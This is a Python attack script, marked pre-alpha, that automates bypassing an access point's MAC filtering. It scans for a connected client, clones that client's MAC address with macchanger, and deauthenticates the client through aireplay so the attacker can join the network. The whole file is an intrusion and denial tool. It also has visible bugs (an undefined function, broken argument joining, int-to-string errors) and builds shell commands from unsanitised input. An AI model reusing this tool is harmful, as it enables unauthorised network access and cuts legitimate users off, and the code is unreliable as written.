#!/usr/bin/python

# function: automates the process of bypassing mac filtering of an access point

#CURRENT PROBLEM: THE GETOUTPUT FUNCTION DOESN'T SEEM TO WORK CORRECTLY THE SECOND TIME, WHE THE BSSID OF THE CLIENT IS BEING DETERMINED (THE EXECUTE FUNCTION WORKS AS EXPECTED). NOTE: THE FUNCTION PUTS OUT MEANINGLESS TEXT, WICH GET BIGGER EACH TIME IT IS RUN

from sys import argv, exit
import subprocess

version = "[v1.0_pre-alpha]"
tad = "12/2/2017 6:27"

def help():
	print ("What it does:\nThis script automates the process of bypassing mac filtering of an access point. It does that by finding a host connected to that access point, masking the BSSID of an interface as the host's and kicking the host from the network for a given time interval.\n")

	print("Usage: '" + argv[0] + " <ESSID> <interface> [seconds]'")
	print("\tinterface: The interface to be used")
	print("\tseconds: The number of seconds the host will be disconnected for. It must be a positive integer. If it is omitted, a default time of 180 seconds (3 minutes) will be used")
	print("\tESSID: The ESSID of the network\n")
	print("Example: '" + argv[0] + " WIND_WIFI wlan0 3'\n")

	print("If the first argument is 'help', this help will be displayed")

#find out if a string represents a positive integer
def isPositiveInt(s):
	try:
		i = int(s)
		if i < 0:
			return False
		return True
	except ValueError:
		return False

def error(message):
	print("Error: " + message)
	exit()

def getOutput(command):
	child = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
	stdout, nothing = child.communicate()

	return str(stdout)

def execute(command):
	child = subprocess.Popen(command, stderr=subprocess.STDOUT, shell=True)

def askUser():
	decision = input("Are you sure you want to continue?(y/n)")

	if decision == 'y' or decision == 'Y':
		return True
	elif decision == 'n' or decision == "N":
		return False
	else:
		print("Invalid input. 'y' or 'n' expected")
		return askUser()

#TODO make sure first argument is an existing interface
def verifyArguments():
	if len(argv) > 1:
		if argv[1] == "help":
			help()
			exit()

	if len(argv) < 3:
		error("Not enough arguments. Use the argument 'help' for more information")

	if len(argv) > 3:
		if not isPositiveInteger(argv[2]):
			error("The third argument must be a positive integer")

#find the channel and the BSSID of the access point
#TODO error handling
#TODO make it work with an ESSID with multiple words
def findInfo(ESSID, interface):
	output = getOutput("./airodump_wrapper " + interface)

	for item in output.split("\n"):
		if ESSID in item:
			words = item.split()

			return (words[words.index(ESSID) - 5], words[words.index(ESSID) - 10])

		else:
			error("No access point with the ESSID '" + ESSID+ "' could be detected")

#get the BSSID of one of the clients
#TODO error handling
#TODO make it work with an ESSID with multiple words
def getClientBSSID(channel, ap_BSSID, interface):
	execute("./airodump_wrapper " + ap_BSSID + " " + channel + " " + interface)
	output = getOutput("./airodump_wrapper " + ap_BSSID + " " + channel + " " + interface)

	try:
		lines = output.split("\n")

		#-------- <DEBUG> --------
		print("[DEBUG] len(lines): " + str(len(lines)))
		print("[DEBUG] len(output): " + str(len(output)))
		print("[DEBUG] command: ./airodump_wrapper " + ap_BSSID + " " + channel + " " + interface)

		#if len(lines) < 100:
		#	print("[DEBUG] <output>")
		#	print(output)
		#	print("[DEBUG] </output>")
		#-------- </DEBUG> --------


		for i in range(1, len(lines)):
			if "RATE" in lines[i]:
				#-------- <DEBUG> --------
				print("[DEBUG] 'RATE' is in output")
				#-------- </DEBUG> --------

				words = (lines[i + 1]).split()

				if words[1] == "associated)":
					#-------- <DEBUG> --------
					print("[DEBUG] client BSSID: " + words[2])
					#-------- </DEBUG> --------

					return words[2]
				else:
					#-------- <DEBUG> --------
					print("[DEBUG] client BSSID: " + words[1])
					#-------- </DEBUG> --------

					return words[1]

		error("An error occurred")

	except IndexError:
		error("No host connected to the access point could be detected")

#TODO error handling
#switch the interfaces BSSID to the BSSID of the detected client
def maskAsClient(client_BSSID, interface):
	#-------- <DEBUG> --------
	print("[DEBUG] client_BSSID: " + client_BSSID)
	print("[DEBUG] interface: " + interface)
	#-------- </DEBUG> --------

	execute("ifconfig " + interface + " down")
	execute("macchanger -m " + client_BSSID + " " + interface)
	execute("ifconfig " + interface + " up")

#TODO error handling
def kickClient(client_BSSID, ap_BSSID, timeout, interface):
	execute("./aireplay_wrapper " + ap_BSSID + client_BSSID + interface + timeout)

def main():
	print(argv[0] + " " + version + "\n" + "Development started " + tad + "\n")

	verifyArguments()

	print("WARNINGS:")
	print("\t-Make sure the interface is already in monitor mode when you run this script, as automatically detecting the state of the interface and changing it if necessary is not supported by the current version of the script")
	print("\t-The current version of the script does not support ESSIDs with multiple words (spaces in the ESSID)")
	print("\t-This script needs to be executed with root privileges\n")

	if not askUser():
		exit()

	time = 180

	if len(argv) > 3:
		time = int(argv[3])

	ESSID = argv[1]
	interface = argv[2]

	#TODO make sure the card is running in monitor mode

	print("\nDetermining the BSSID and channel of the access point with the given ESSID...")
	channel, ap_BSSID = findInfo(ESSID, interface)
	print("Channel: " + channel)
	print("BSSID of acccess point: " + ap_BSSID)

	print("\nFinding the BSSID of a client connected to the access point...")
	client_BSSID = getClientBSSID(channel, ap_BSSID, interface)
	print("BSSID of client: " + client_BSSID)

	print("Changing the interface's BSSID to that of the found client...")
	maskAsClient(client_BSSID, interface)

	print("Kicking Client...")
	print("You should be able to connect to the network now. After " + time + " minutes the other host will be able to reconnect")

	#TODO Reset BSSID afterwards
	print("Make sure to change the BSSID of the interface back to the original afterwards")
	#only use if the interface was initially in station mode
	#print("Make sure to put the interface '" + interface + "' back in station mode afterwards")

	kickClient(client_BSSID, ap_BSSID, time, interface)

main()
